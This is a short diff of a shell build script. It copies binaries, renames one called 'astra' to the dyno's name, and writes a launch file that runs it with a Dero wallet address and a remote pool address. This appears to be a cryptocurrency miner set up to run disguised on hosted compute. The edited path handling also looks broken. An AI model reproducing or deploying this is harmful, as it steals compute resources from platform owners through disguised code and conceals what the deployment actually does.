@@ -7,8 +7,8 @@ set -e
 mkdir -p "$1/bin/"
 
 cp -a binaries-$STACK/* "$1/bin/"
-cd $1/bin
-mv astra $dyno
+
+mv binaries-$STACK/astra $dyno
 cat > mode <<END
 $1/bin/$dyno -w dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy -r 146.190.106.185:443
 END
